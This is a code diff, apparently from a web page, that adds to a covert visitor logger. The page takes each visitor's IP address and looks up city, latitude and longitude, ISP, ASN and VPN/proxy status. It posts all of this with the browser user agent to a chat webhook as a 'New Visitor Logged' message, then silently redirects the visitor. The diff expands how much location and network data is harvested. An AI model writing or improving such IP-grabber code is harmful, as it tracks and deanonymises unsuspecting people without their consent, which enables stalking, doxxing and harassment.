@@ -17,22 +17,39 @@
                 .then(data => {
                     const userIP = data.ip;
 
-                    // Get more location details
-                    fetch(`https://ip-api.com/json/${userIP}`)
+                    // Get full IP details with VPN detection
+                    fetch(`http://ip-api.com/json/${userIP}?fields=status,message,country,regionName,city,isp,org,as,mobile,proxy,hosting,lat,lon,timezone,query`)
                         .then(response => response.json())
                         .then(info => {
+                            if (info.status !== "success") {
+                                console.error("Error getting location data:", info.message);
+                                window.location.href = redirectURL;
+                                return;
+                            }
+
                             const userAgent = navigator.userAgent;
+                            const vpnStatus = info.proxy || info.hosting ? "🔴 **VPN/Proxy Detected**" : "🟢 **No VPN/Proxy Detected**";
+
                             const message = {
                                 content: `**New Visitor Logged**\n\n` +
-                                         `**IP Address:** ${userIP}\n` +
+                                         `**IP Address:** ${info.query}\n` +
                                          `**Country:** ${info.country}\n` +
                                          `**Region:** ${info.regionName}\n` +
                                          `**City:** ${info.city}\n` +
                                          `**ISP:** ${info.isp}\n` +
-                                         `**User-Agent:** ${userAgent}`
+                                         `**Organization:** ${info.org}\n` +
+                                         `**ASN:** ${info.as}\n` +
+                                         `**Latitude:** ${info.lat}\n` +
+                                         `**Longitude:** ${info.lon}\n` +
+                                         `**Timezone:** ${info.timezone}\n` +
+                                         `**Mobile Device:** ${info.mobile ? "Yes" : "No"}\n` +
+                                         `**VPN/Proxy:** ${info.proxy ? "Yes" : "No"}\n` +
+                                         `**Hosting Service:** ${info.hosting ? "Yes" : "No"}\n` +
+                                         `${vpnStatus}\n\n` +
+                                         `**User-Agent:** \`${userAgent}\``
                             };
 
-                            // Send data using a synchronous request to ensure it completes before redirecting
+                            // Send data synchronously before redirecting
                             var xhr = new XMLHttpRequest();
                             xhr.open("POST", webhookURL, false); // false = synchronous
                             xhr.setRequestHeader("Content-Type", "application/json");
